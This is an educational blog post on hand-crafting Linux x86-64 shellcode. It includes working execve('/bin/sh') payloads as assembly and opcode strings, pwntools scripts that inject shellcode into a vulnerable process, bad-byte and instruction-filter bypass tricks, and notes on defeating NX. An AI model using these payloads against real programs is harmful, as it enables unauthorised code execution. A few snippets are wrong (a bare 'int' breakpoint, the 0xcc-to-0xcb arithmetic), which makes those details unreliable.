---
title: The Shellcode Blacksmith | Sensei
author: x4sh3s
date: 2023-05-09
categories: [Sensei, malware]
tags: [lowlevel, malware]
permalink: /sensei/shellcode-blacksmith
image: /assets/img/thumbnails/shellcoding.png
---

<br>

Welcome to the first post of my series on various low level topics. In this series, I will focus as deeply as possible into more *advanced* topics, rather than simply explaining common vulnerabilities like SQL injection or XSS. Instead, I'll be focusing on subjects that I find more interesting.
Since this is my first post of this kind, I'd like to emphasize an important point. I know that many of you may not bother to read this post, so to grab your attention, I've uploaded it as an image. Don't judge my graphical skills, plz.
![](/assets/img/sensei/shellcode/dialogue-1.png)

<br>

---

## Introduction

As one wise man once said:
![](/assets/img/sensei/shellcode/sun-tzu.png)

First things first, let's answer a simple question: **Who is the man in the picture above (not the Chinese one)?** His name is **John Von Neumann**, one of the fathers of computing. Nowadays, almost all computer architectures, including x86, ARM, MIPS, and PPC, use the Von Neumann architecture. But what does this mean?

In the Von Neumann architecture, **data is saved as code**, which means that anything we save on the computer will be treated as code. This is the basic theory of **shellcoding**. If data can be executed as code, why not input actual code when a program asks for a name instead of our name? As [Xeno](https://twitter.com/XenoKovah) denominates, **ACID** (**A**ttacker-**C**ontrolled **I**nput **D**ata, maybe a joke name but better than *tainted data*!).

The term *shellcode* comes from *shell* (because usually, you want to spawn a shell) and *code* (because... it's code). The name was created in the famous post [Smashing the Stack for Fun and Profit](http://www.phrack.com/issues/49/14.html). This code needs to be inserted into the program. I won't explain exploitation theory in this post, as it is focused on shellcoding. But it's important to note that these vulnerabilities will open a window for inserting the shellcode, with some restrictions that will be covered later.

Typically, these shellcodes are injected onto the stack. Nowadays, with the **NX** protection, the stack is no longer executable. This has nearly mitigated all shellcoding for stack buffer overflow. But other systems, like embedded OS, still use an executable stack. Additionally, other exploitation methods allow the shellcode to be injected into an executable **segment**[^footnote].

<br>

But you may still be wondering, *what is a shellcode*? Here is a simple example:
```nasm
xor eax, eax
mov al, 1
int 0x80 
```

For those who don't know what this code does, let's introduce them to **syscalls**. *System calls* are instructions that directly communicate with the kernel in both Windows and Linux systems. Both kernels have an API with functions. Typically, we don't interact with syscalls directly and let compilers do the work for us. But as we are creating shellcodes from scratch, we need to call them directly. There are some assembly instructions to make the call, like the `syscall` instruction that we will see later. But using kernel **interrupts**[^fn-nth-2] will also make a syscall if the parameters are correct.

Some websites have documented all the syscalls available for each architecture, like [syscall.sh](https://syscall.sh/). But I personally recommend using the man command with each. For the `exit` syscall, we need to set the **AL** register (**A**ccumulator Register **L**ower 8 bits) to 1. To make sure the register is clean, we `xor` it by itself and then set the 8 lower bits to 1. Then, an interrupt to the 0x80 hex value (128 decimal) will trigger the `exit` syscall.

Maybe breaking a program is not the aim of our shellcode, but shellcodes can go as far as we want (or can). But this is just a simple example, and we will delve into more realistic shellcodes later.

As my knowledge is limited, I will only discuss Linux shellcodes for x86. In future posts, I may cover other architectures and operating systems.

<br>

---

## Forging Shellcodes

You may have noticed that these shellcodes consist only of assembly instructions. These instructions must be understandable by the system, and the program will not encode our instructions to **opcodes**[^fn-nth-3]. Therefore, we need to find a way to obtain the opcodes in advance. While there is no limit to generating shellcodes, let's talk about the two standard ways:

### ASM Code

We can write our code directly in assembly. For example, we will generate a shellcode that executes `/bin/sh` using the `execve` system call:
```nasm
global _start
section .text
_start:
  xor rsi,rsi
  push rsi
  mov rdi,0x68732f2f6e69622f
  push rdi
  push rsp
  pop rdi
  push 59
  pop rax
  cdq
  syscall
```
{: file='shellcode.s'}

The first two instructions clear the RSI register and push its value onto the stack:
```nasm
xor rsi,rsi
push rsi
```

Next, the address of the string `/bin/sh` is moved to the RDI register and pushed onto the stack:
```nasm
mov rdi,0x68732f2f6e69622f ; /bin/sh
push rdi
```

We move the stack pointer into the RDI register, which is now pointing to the start of the `/bin/sh` string, and then push the value 59, which corresponds to the `execve` system call in x86_64 assembly, onto the stack:
```nasm
push rsp
pop rdi
push 59
```

Finally, we set the system call number in RAX, and perform the `execve` system call:
```nasm
pop rax
cdq
syscall
```

We can compile the shellcode as any NASM file:
```console
$ nasm -f elf64 shellcode.s -o shellcode.o
$ ld shellcode.o -o shellcode
```

> Another way to compile it is to use GCC: `gcc -nostdlib -static shellcode.s -o shellcode`
{: .prompt-info}

We can verify that the shellcode has been properly compiled:
```console
$ objdump -M intel -d shellcode

shellcode: file format elf64-x86-64


Disassembly of section .text:

0000000000401000 <_start>:
  401000:	48 31 f6 	xorrsi,rsi
  401003:	56   	push   rsi
  401004:	48 bf 2f 62 69 6e 2f 	movabs rdi,0x68732f2f6e69622f
  40100b:	2f 73 68 
  40100e:	57   	push   rdi
  40100f:	54   	push   rsp
  401010:	5f   	poprdi
  401011:	6a 3b	push   0x3b
  401013:	58   	poprax
  401014:	99   	cdq
  401015:	0f 05	syscall
```

Now take your sysadmins skills to shine, or as I did copy it from [cocomelonc](https://cocomelonc.github.io/tutorial/2021/10/09/linux-shellcoding-1.html):
```console
$ objdump -d shellcode|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
```

And we have our beautiful shellcode ready to be deployed. We can test it on our host system:
![](/assets/img/sensei/shellcode/test-execve.png)

### C Code

Now, let's create the same shellcode in C. Here is a simple program that will do the trick:
```c
#include <stdio.h>

void main() {
   char *name[2];

   name[0] = "/bin/sh";
   name[1] = NULL;
   execve(name[0], name, NULL);
}
```
{: file='shellcode.c'}

Compile the code statically using the following command:
```console
$ gcc -o shellcode -ggdb -static shellcode.c
```

You can extract the opcodes from the compiled binary using a disassembler, such as GDB. Here is an example of how to do this:
```console
(gdb) disassemble main
Dump of assembler code for function main:
   0x0000000000401765 <+0>:	push   %rbp
   0x0000000000401766 <+1>:	mov%rsp,%rbp
   0x0000000000401769 <+4>:	sub$0x20,%rsp
   0x000000000040176d <+8>:	mov%fs:0x28,%rax
   0x0000000000401776 <+17>:	mov%rax,-0x8(%rbp)
   0x000000000040177a <+21>:	xor%eax,%eax
   0x000000000040177c <+23>:	lea0x73881(%rip),%rax# 0x475004
   0x0000000000401783 <+30>:	mov%rax,-0x20(%rbp)
   0x0000000000401787 <+34>:	movq   $0x0,-0x18(%rbp)
   0x000000000040178f <+42>:	mov-0x20(%rbp),%rax
   0x0000000000401793 <+46>:	lea-0x20(%rbp),%rcx
   0x0000000000401797 <+50>:	mov$0x0,%edx
   0x000000000040179c <+55>:	mov%rcx,%rsi
   0x000000000040179f <+58>:	mov%rax,%rdi
   0x00000000004017a2 <+61>:	call   0x4104f0 <execve>
   0x00000000004017a7 <+66>:	nop
   0x00000000004017a8 <+67>:	mov-0x8(%rbp),%rax
   0x00000000004017ac <+71>:	sub%fs:0x28,%rax
   0x00000000004017b5 <+80>:	je 0x4017bc <main+87>
   0x00000000004017b7 <+82>:	call   0x411480 <__stack_chk_fail_local>
   0x00000000004017bc <+87>:	leave
   0x00000000004017bd <+88>:	ret
End of assembler dump.
```
{: file='GDB output'}

> I will not cover how to extract the opcodes from this, as we have already seen it.
{: .prompt-info}

<br>

There are other ways to send shellcode to a program. For example, suppose we have a binary that reads some input via **stdin**. In that case, we can use the `cat` command to send the input. As you may already know, this command replicates whatever input you send it (an empty cat command on the terminal will replicate each string you send). This command can be very useful when we need to send binaries to other binaries. For instance:
```console
$ cat shellcode | ./vulnerable
```

This will send the entire binary to the other binary, so we don't need to extract the opcodes. The **pwntools** library in Python can help us send shellcode without even compiling it:
```python
from pwn import *

context(os="linux", arch="amd64")

sc = asm("""
xor rsi,rsi
push rsi
mov rdi,0x68732f2f6e69622f
push rdi
push rsp
pop rdi
push 59
pop rax
cdq
syscall
""")

p = process("/vulnerable")
p.send(sc)
p.interactive()
```

But we will discuss this library later.

Now the real magic of shellcoding begins. We need to go through the different system calls, choose the ones we want to execute, set the parameters, and call them. Easy, right? But the real problem arises when certain characters (such as null bytes) may trigger the program to stop, break some return values on the stack and make the program crash (which may not be ideal for a remote exploit), or even have a limited size to inject the shellcode.

This is when the difference between a good and a bad blacksmith is made. But don't worry, not everyone is suited for smithing :).

<br>

---

## Debugging It!

First off, why would we be interested in debugging our shellcode? As mentioned earlier, shellcoding is not as simple as just writing the code you want to execute. There are multiple factors that can cause our shellcode to crash without us even knowing. By debugging our shellcode, we can ensure that we have implemented it correctly and eliminate errors before they occur.

The first and most basic way to do this is by using the `strace` command. This command traces all the syscalls that your program is making. You can use the following syntax:
```console
$ strace ./shellcode
```

You can also debug the shellcode as stdin if you have the program locally:
```console
$ cat shellcode | strace ./vulnerable
```

This allows you to see what your shellcode is actually doing. The other, more obvious way is through `gdb`. Since you have complete control over your shellcode, you can even insert breakpoints outside of GDB using the `int` instruction, like this:
```nasm
global _start
section .text
_start:
    xor rsi,rsi
    push rsi
    mov rdi,0x68732f2f6e69622f
    push rdi
    push rsp
    pop rdi
    push 59
    pop rax
    cdq
    int  ; new instruction added
    syscall
```
{: file='shellcode.s'}

In this example, we set a breakpoint just before the syscall so we can check that all our registers are set as we want. But we can also use GDB to send the shellcode, like this:
```console
$ gdb ./vulnerable
(gdb) r < shellcode
```

<br>

---

## Forbidden Smithing

There are certain bytes that can cause issues in our shellcodes, such as null bytes, new lines, spaces, etc. For example:

| **Byte** | **Method** | 
| --------- | ---------- |
| Null byte \0 (`0x00`) | strcpy |
| Newline \n (`0x0a`) | scanf gets getline fgets | 
| Carriage return \r (`0x0d`) | scanf |
| Space (`0x20`) | scanf |
| Tab \t (`0x09`) | scanf |
| DEL (`0x7f`) | protocol-specific |


However, there are many other forbidden bytes that we may not know of, which can cause our shellcode to fail. To address this issue, we can manually identify such forbidden bytes and find ways to work around them.

### Null Bytes

For example, if we need to zero out a register, we can use the `mov` instruction, but its opcode will contain multiple null bytes.
```nasm
mov rax, 0
```

To avoid this, we can use alternative instructions such as `xor` to achieve the same result of zeroing the register.
```nasm
xor rax,rax
```

And without using 0, we have zeroed the register. We have an infinite number of possibilities here.
```nasm
mov rax,5
```

For example, instead of simply adding 5, we can use some unconventional techniques such as:
```nasm
xor rax,rax
mov al,5
```

### Instructions Filters

But what happens if an instruction itself is blocked, such as `int` instruction that is used for making syscalls in our shellcode? We can bypass such instruction filters by modifying the instruction to execute a similar functionality. For instance, we can add 0x01 to the hex value of `int` (0xcc) to create a new instruction and execute it:
```nasm
inc BYTE PTR [rip]
.byte 0xcb
```

With this modification, the filter for `int` is bypassed, and we can make syscalls in our shellcode.

<br>

---

## Possible Issues

Forbidden bytes or instructions are not the only obstacles that we may face when shellcoding. We can also encounter a variety of problems with ambiguous or unspecified sizes, such as:

| **Size** | **Ambiguity** | **Unambiguity** |
| -------- | -------------- | ---------------- | 
| Single byte | `mov [rax], bl` | `mov BYTE PTR [rax], 5` |
| 2-byte word | `mov [rax], bx` | `mov WORD PTR [rax], 5` |
| 4-byte dword | `mov [rax], ebx` | `mov DWORD PTR [rax], 5` |
| 8-byte qword | `mov [rax], rbx` | `mov QWORD PTR [rax], 5` |

However, the list of potential issues doesn't end there. Shellcode can encounter a variety of issues depending on the specific program it's running on, such as:
- Sorting
- Compression/Decompression
- Encryption/Decryption
- Serialization/Deserialization

Additionally, not every program allows us to spawn a shell and receive its output. In those cases, we may need to find alternative ways to work with the output, such as writing it to a file or modifying system files. As you can see, the possibilities are endless and limited only by your imagination.

<br>

---

## Cross-Architecture Forging

While I mentioned earlier that I lack the knowledge to cover other architectures in-depth, I can provide some instructions on how to compile shellcodes for different architectures, in case anyone is interested:

| **Arch** | **Command** |
| -------- | ------------ |
| x86_32 | `gcc -m32 -nostdlib -static shellcode.s -o shellcode` |
| amd64 | `gcc -nostdlib -static shellcode.s -o shellcode` |
| mips | `mips-linux-gnu-gcc -nostdlib shellcode.s -o shellcode` |
| arm64 | `aarch64-linux-gnu-gcc -nostdlib -static shellcode.s -o shellcode` |
| armv7 | `arm-linux-gnueabi-gcc -nostdlib -static shellcode.s -o shellcode` |
| powerpc64 | `powerpc64-linux-gnu-gcc -nostdlib -static shellcode.s -o shellcode` |
| sparc64 | `sparc64-linux-gnu-gcc -nostdlib -static shellcode.s -o shellcode` |
| riscv64 | `riscv64-linux-gnu-gcc -nostdlib -static shellcode.s -o shellcode` |

> Remember that the exact command may vary depending on your specific setup and environment, and you may need to install additional libraries or dependencies for the compilation to work properly.
{: .prompt-warning}

Additionally, it's worth noting that the process of crafting shellcodes for both 32-bit and 64-bit systems is similar. I focused on 64-bit systems in this guide as they are more commonly used nowadays, but knowing how to craft shellcodes for 64-bit systems can also help with crafting them for 32-bit systems.

<br>

---

## Hire a Blacksmith

Sometimes, shellcoding can be a difficult process to achieve. That's why we can use shellcode generators to help ourselves out. But before using these tools, we need to understand the *forging* of shellcodes so that we know what code is generated and how we can modify it if needed. These tools typically avoid common forbidden bytes, such as null bytes or newlines. However, programs can have their own forbidden bytes. Therefore, it's important to understand our code so that we can modify it.

So, what tool should we use for shellcode generation? Obviously, pwntools. This library has a `shellcraft` class with MANY different shellcodes already prepared. For example, here's how you can generate a simple shell spawn:
```python
>>> from pwn import *
>>> print(shellcraft.sh())
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016972
    xor ecx, ecx
    push ecx /* null terminate */
    push 4
    pop ecx
    add ecx, esp
    push ecx /* 'sh\x00' */
    mov ecx, esp
    xor edx, edx
    /* call execve() */
    push SYS_execve /* 0xb */
    pop eax
    int 0x80
```

You can even use pwntools to generate the shellcode and convert it to opcodes for you. Here's an example of a script that generates a shellcode to print a flag:
```python
from pwn import *

context(os="linux", arch="amd64")
p = process("/vulnerable")

file = asm(shellcraft.cat("/flag"))

p.send(file)
p.interactive()
```

This script generates the shellcode, converts it to opcodes, and sends it to a running process.

<br>

---

## Final Challenge

Let's get real for the end. Shellcoding may seem cool, but it is nearly dead. Modern systems implement the **NX** (**N**o e**X**ecute Byte), which removes the stack and heap executable property. In fact, there are three memory permissions (`PROT_READ`, `PROT_WRITE`, and `PROT_EXEC`), and a segment will not (typically) be writable and executable at the same time. The code of the program is usually allocated at the `.text` segment, which is readable and executable. Why would a program need another segment to be executable?

So, is this the end of shellcoding? Well, not quite yet.

### De-Protecting Memory

If the memory is protected, why not revoke these protections? If we are able to call the `mprotect(PROT_EXEC)` function to our shellcode, we can make it executable. Easy, right?
As you can guess, finding it is not as easy as it sounds. We can't execute code, so we need that function to already be present in our program, and call it through **ROP** (**R**eturn **O**riented **P**rogramming). So this is not a 100% reliable method.

### JIT

The **Just In Time Compilation** is present in programs that need to recompile themselves frequently, changing the code during execution. Because programs don't have a writable-executable segment, they change the permissions during execution. It can be done like this:
- `mmap(PROT_READ|PROT_WRITE)`
- write the code
- `mmap(PROT_READ|PROT_EXEC)`
- execute
- `mmap(PROT_READ|PROT_WRITE)`
- update code
- ...

However, we run into another problem. System calls are **slow** and JIT is **fast**, so we don't have time to inject our shellcode into that space. Thankfully, we have two options here:

#### JIT Spraying

If we find and overwrite some variables that JIT will write, we can inject our shellcode into an executable segment. But then, we need to chain with another vulnerability that allows us to jump to the shellcode.

It may sound difficult to achieve, but JIT is present in many software, such as Java, browsers, and many interpreted language runtimes. So the attack surface increases quickly.

#### Libraries

The other option is to aim for libraries. They tend to have writable-executable pages, and if our program uses them, we will have a writable-executable page in memory that we can use.

<br>

---

## References

- [Pwn College](https://pwn.college/)
- [VXU Papers](https://papers.vx-underground.org/papers/Linux/Process%20Injection/2013-02-10%20-%20Shellcoding%20in%20Linux.pdf)
- [Cocomelonc Blog](https://cocomelonc.github.io/)
- [Smashing the Stack](http://www.phrack.com/issues/49/14.html)


<br>

---

## Footnotes

[^footnote]: Memory paging is an operating system memory management technique that divides a computer's primary memory into smaller parts, called pages.
[^fn-nth-2]: These are special routines that halt the software execution, usually to switch between userland and kernelspace.
[^fn-nth-3]: Opcode is the portion of a machine language instruction that specifies the operation to be performed.
